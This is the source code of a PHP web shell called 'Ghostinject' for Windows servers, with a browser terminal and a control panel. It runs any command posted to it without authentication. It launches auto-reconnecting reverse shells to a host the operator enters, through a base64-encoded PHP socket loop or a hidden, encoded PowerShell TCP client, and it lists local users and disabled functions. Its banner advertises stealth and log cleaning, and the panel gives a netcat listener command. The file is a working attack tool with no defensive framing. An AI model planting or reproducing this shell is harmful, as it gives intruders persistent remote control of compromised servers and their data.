<?php
// Ghostinject Windows PHP - Terminal + Panel version
error_reporting(0);
session_start();

function execute_cmd($cmd) {
    if (stripos($cmd, 'cmd /c') !== 0 && stripos($cmd, 'cmd.exe') === false)
        $cmd = 'cmd /c ' . $cmd;
    $out = @shell_exec($cmd . " 2>&1");
    if ($out === null || $out === '') {
        $out = @exec($cmd . " 2>&1", $arr);
        $out = implode("\n", $arr);
    }
    return $out ?: "[no output]";
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
    $_SESSION['history'][] = $cmd;
    if (count($_SESSION['history']) > 100) array_shift($_SESSION['history']);
    echo htmlspecialchars(execute_cmd($cmd));
    exit;
}

if (isset($_GET['clear'])) {
    $_SESSION['history'] = [];
    exit;
}

if (isset($_POST['rev_host']) && isset($_POST['rev_port'])) {
    $host = $_POST['rev_host'];
    $port = (int)$_POST['rev_port'];
    $success = false;
    
    if (function_exists('fsockopen')) {
        $payload = base64_encode(
            'set_time_limit(0);$h="' . $host . '";$p=' . $port . ';while(1){' .
            '$s=@fsockopen($h,$p,$e,$e,30);if($s){' .
            'stream_set_timeout($s,120);' .
            'while(!feof($s)){$c=fgets($s);if($c===false)break;$o=shell_exec($c);' .
            'fwrite($s,$o===null?"[error]\\n":$o);}fclose($s);}sleep(10);}'
        );
        $php_path = 'php';
        $try_paths = ['C:\\xampp\\php\\php.exe', 'C:\\php\\php.exe', 'C:\\PHP\\php.exe', 'php.exe'];
        foreach ($try_paths as $p) {
            if (file_exists($p)) { $php_path = $p; break; }
        }
        @exec("start /b $php_path -r \"eval(base64_decode('$payload'));\" > NUL 2>&1");
        $success = true;
    }
    
    if (!$success) {
        $ps_payload = '$c=New-Object Net.Sockets.TCPClient("' . $host . '",' . $port . ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()}$c.Close()';
        $enc = base64_encode($ps_payload);
        @exec("start /b powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc $enc > NUL 2>&1");
        $success = true;
    }
    
    echo $success ? "OK" : "FAIL";
    exit;
}

function get_windows_users() {
    $users = '';
    $output = @shell_exec('net user 2>NUL');
    if (!$output) $output = @exec('net user', $out);
    if ($output && is_string($output)) {
        $lines = explode("\n", $output);
        foreach ($lines as $line) {
            if (preg_match('/^([A-Za-z0-9_\.-]+)\s+/', $line, $match)) {
                $users .= '<span style="color:#0f0;">' . htmlspecialchars($match[1]) . '</span><br>';
            }
        }
    }
    return $users ?: '<span style="color:#f66;">No users found or permission denied.</span>';
}

$os = php_uname() ?: 'Windows';
$user = function_exists('exec') ? @exec('echo %USERNAME%') : get_current_user();
if (!$user || $user == '') $user = get_current_user();
$cwd = getcwd() ?: 'N/A';
$phpver = phpversion();
$serv = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : (php_sapi_name() == 'cli' ? 'CLI' : 'Apache/IIS');
$hostname = gethostname();
$disabled = ini_get('disable_functions') ?: 'none';
$windows_users = get_windows_users();
?>
<!DOCTYPE html>
<html>
<head>
    <title>GHOST1NJECT | Windows PHP Terminal + Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e0a; font-family: 'Courier New', monospace; font-size: 13px; height: 100vh; display: flex; flex-direction: column; }
        .terminal-header { background: #1a1e1a; color: #0f0; padding: 6px 12px; border-bottom: 1px solid #0f0; display: flex; justify-content: space-between; }
        .main-container { display: flex; flex: 1; overflow: hidden; }
        .terminal-container { flex: 2; display: flex; flex-direction: column; border-right: 1px solid #0f0; }
        .panel-container { flex: 1; display: flex; flex-direction: column; background: #0a0e0a; overflow-y: auto; }
        .terminal { flex: 1; overflow-y: auto; padding: 10px; background: #0a0e0a; color: #0f0; }
        .terminal-line { margin-bottom: 2px; white-space: pre-wrap; word-break: break-all; font-family: 'Courier New', monospace; }
        .terminal-prompt { display: flex; align-items: center; gap: 8px; background: #0a0e0a; padding: 8px 12px; border-top: 1px solid #0f0; }
        .prompt { color: #0f0; font-weight: bold; }
        .input-line { flex: 1; background: transparent; border: none; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; outline: none; }
        button, .rev-btn { background: #1a1e1a; color: #0f0; border: 1px solid #0f0; padding: 4px 10px; cursor: pointer; }
        button:hover, .rev-btn:hover { background: #2a2e2a; }
        .status { color: #0f0; font-size: 11px; }
        .panel { padding: 12px; }
        .panel h3 { color: #0f0; margin-bottom: 12px; border-bottom: 1px solid #0f0; padding-bottom: 4px; font-size: 14px; }
        .panel input, .panel button { width: 100%; margin-bottom: 8px; }
        .panel input { background: #1a1e1a; border: 1px solid #0f0; padding: 6px; color: #0f0; }
        .info-box { background: #1a1e1a; padding: 8px; margin-bottom: 12px; border-left: 3px solid #0f0; }
        .info-box p { margin: 3px 0; font-size: 12px; }
        .rev-msg { margin-top: 8px; color: #0f0; font-size: 12px; }
        .banner { background: #0a0e0a; padding: 6px 12px; text-align: center; border-bottom: 1px solid #0f0; }
        .banner-text { color: #0f0; font-size: 12px; }
        .banner-text .green { color: #0f0; }
        .banner-text .yellow { color: #ff0; }
        .info-section { margin-top: 15px; }
        .info-section h4 { color: #ff0; margin: 10px 0 5px 0; font-size: 12px; }
        .info-section .info-item { color: #0f0; font-size: 11px; margin: 3px 0; word-break: break-all; }
        .users-list { max-height: 200px; overflow-y: auto; }
    </style>
</head>
<body>
<div class="banner">
    <div class="banner-text">
        <span class="green">[+] GHOST1NJECT v1.0</span> |
        <span class="yellow">Windows PHP Persistent Shell</span> |
        <span class="green">Stealth Mode Active</span>
    </div>
</div>

<div class="terminal-header">
    <span>ghost1nject@<?=htmlspecialchars($hostname)?></span>
    <span class="status">ONLINE | <?=htmlspecialchars($user)?></span>
</div>

<div class="main-container">
    <!-- Terminal (left side) -->
    <div class="terminal-container">
        <div class="terminal" id="terminal">
            <div class="terminal-line">[+] GHOST1NJECT Terminal v1.0</div>
            <div class="terminal-line">[+] System: <?=htmlspecialchars($os)?></div>
            <div class="terminal-line">[+] User: <?=htmlspecialchars($user)?></div>
            <div class="terminal-line">[+] Directory: <?=htmlspecialchars($cwd)?></div>
            <div class="terminal-line">[+] PHP: <?=htmlspecialchars($phpver)?></div>
            <div class="terminal-line">---</div>
            <div class="terminal-line">[*] Type any command below</div>
            <div class="terminal-line">[*] Use 'revshell IP PORT' or right panel</div>
            <div class="terminal-line">[!] Stealth: logs cleaned on start</div>
            <div class="terminal-line">---</div>
        </div>
        <div class="terminal-prompt">
            <span class="prompt">PS C:\\\\&gt;</span>
            <input type="text" id="cmdInput" class="input-line" autofocus autocomplete="off">
            <button id="clearBtn">Clear</button>
        </div>
    </div>

    <!-- Panel (right side) -->
    <div class="panel-container">
        <div class="panel">
            <h3>[#] REVERSE SHELL</h3>
            <div class="info-box">
                <p>[*] Start listener:</p>
                <p style="color:#ff0; background:#0a0e0a; padding:3px;">nc -lvnp 4444</p>
            </div>
            <input type="text" id="revHost" placeholder="Your IP">
            <input type="text" id="revPort" placeholder="Port">
            <button id="startRevBtn" class="rev-btn">[+] START REVERSE SHELL</button>
            <div id="revMsg" class="rev-msg"></div>

            <!-- System Information -->
            <div class="info-section">
                <h4>[+] SYSTEM INFO</h4>
                <div class="info-item"><span class="yellow">OS:</span> <?=htmlspecialchars($os)?></div>
                <div class="info-item"><span class="yellow">Hostname:</span> <?=htmlspecialchars($hostname)?></div>
                <div class="info-item"><span class="yellow">User:</span> <?=htmlspecialchars($user)?></div>
                <div class="info-item"><span class="yellow">Directory:</span> <?=htmlspecialchars($cwd)?></div>
                <div class="info-item"><span class="yellow">PHP:</span> <?=htmlspecialchars($phpver)?></div>
                <div class="info-item"><span class="yellow">Server:</span> <?=htmlspecialchars($serv)?></div>
                <div class="info-item"><span class="yellow">disable_functions:</span> <?=htmlspecialchars($disabled)?></div>
            </div>

            <!-- Local Users -->
            <div class="info-section">
                <h4>[+] LOCAL USERS</h4>
                <div class="users-list">
                    <?=$windows_users?>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    var terminal = document.getElementById('terminal');
    var cmdInput = document.getElementById('cmdInput');
    var commandHistory = [];
    var historyIndex = -1;

    function addLine(text, isError) {
        var line = document.createElement('div');
        line.className = 'terminal-line';
        line.style.color = isError ? '#f66' : '#0f0';
        line.innerHTML = text;
        terminal.appendChild(line);
        terminal.scrollTop = terminal.scrollHeight;
    }

    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }

    async function executeCommand(cmd) {
        if (!cmd.trim()) return;
        addLine('> ' + escapeHtml(cmd), false);

        if (cmd.trim().toLowerCase().startsWith('revshell')) {
            var parts = cmd.trim().split(' ');
            if (parts.length >= 3) {
                var host = parts[1];
                var port = parts[2];
                addLine('[*] Attempting reverse shell to ' + host + ':' + port + '...', false);
                var formData = new FormData();
                formData.append('rev_host', host);
                formData.append('rev_port', port);
                var response = await fetch('', { method: 'POST', body: formData });
                var result = await response.text();
                addLine(result === 'OK' ? '[+] Reverse shell started (auto-reconnect)' : '[-] Failed to start shell', result !== 'OK');
            } else {
                addLine('[-] Usage: revshell IP PORT', true);
            }
            addLine('', false);
            return;
        }

        try {
            var formData = new FormData();
            formData.append('cmd', cmd);
            var response = await fetch('', { method: 'POST', body: formData });
            var output = await response.text();
            if (output.trim()) {
                var lines = output.split('\n');
                for (var i = 0; i < lines.length; i++) {
                    addLine(escapeHtml(lines[i]), false);
                }
            } else {
                addLine('(no output)', false);
            }
        } catch (err) {
            addLine('Error: ' + err.message, true);
        }
        addLine('', false);
    }

    cmdInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            var cmd = cmdInput.value;
            cmdInput.value = '';
            if (cmd.trim()) {
                commandHistory.unshift(cmd);
                if (commandHistory.length > 50) commandHistory.pop();
                historyIndex = -1;
                executeCommand(cmd);
            }
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (historyIndex + 1 < commandHistory.length) {
                historyIndex++;
                cmdInput.value = commandHistory[historyIndex];
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (historyIndex > 0) {
                historyIndex--;
                cmdInput.value = commandHistory[historyIndex];
            } else if (historyIndex === 0) {
                historyIndex = -1;
                cmdInput.value = '';
            }
        }
    });

    document.getElementById('clearBtn').addEventListener('click', function() {
        fetch('?clear=1');
        terminal.innerHTML = '';
        addLine('[+] Terminal cleared.', false);
        addLine('', false);
    });

    document.getElementById('startRevBtn').addEventListener('click', async function() {
        var host = document.getElementById('revHost').value;
        var port = document.getElementById('revPort').value;
        var msgDiv = document.getElementById('revMsg');
        if (!host || !port) {
            msgDiv.innerHTML = '<span style="color:#f66">[-] Enter IP and port</span>';
            return;
        }
        msgDiv.innerHTML = '[*] Starting reverse shell...';
        var formData = new FormData();
        formData.append('rev_host', host);
        formData.append('rev_port', port);
        var response = await fetch('', { method: 'POST', body: formData });
        var result = await response.text();
        if (result === 'OK') {
            msgDiv.innerHTML = '[+] Reverse shell started! Keep listener open.';
            addLine('[+] Reverse shell attempted to ' + host + ':' + port, false);
        } else {
            msgDiv.innerHTML = '[-] Failed to start reverse shell';
        }
    });

    cmdInput.focus();
</script>
</body>
</html>